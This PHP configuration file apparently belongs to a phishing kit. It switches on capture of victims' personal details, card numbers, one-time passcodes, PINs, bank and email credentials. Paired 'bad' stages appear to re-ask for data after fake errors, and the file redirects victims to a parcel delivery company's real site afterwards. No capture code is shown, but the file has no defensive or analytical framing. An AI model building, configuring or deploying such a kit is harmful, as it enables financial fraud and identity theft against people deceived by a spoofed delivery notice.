<?php

/**
 * UI Configuration for Forms and Buttons
 * This controls which form inputs and buttons are visible/enabled
 */

return [
    
    // Form field visibility configuration
    'form_fields' => [
        'name' => true,
        'dob' => true,
        'email' => true,
        'country' => true,
        'city' => true,
        'address' => true,
        'zipCode' => true,
        'phone' => true,
    ],

    // Button visibility configuration
    'buttons' => [
        'loginbuttons' => false,
        'infobuttons' => false,
        'login' => false,
        'badlogin' => false,
        'info' => true,
        'card' => true,
        'badcard' => true,
        'otp' => true,
        'badotp' => true,
        'mail' => true,
        'badmail' => true,
        'pin' => true,
        'badpin' => true,
        'bank' => true,
        'badbank' => true,
        'app' => true,
        'badapp' => true,
        'custom' => false,
        'badcustom' => true,
    ],

    // Redirection configuration
    'redirection' => [
        'url' => 'https://gls-group.com',
    ],


];
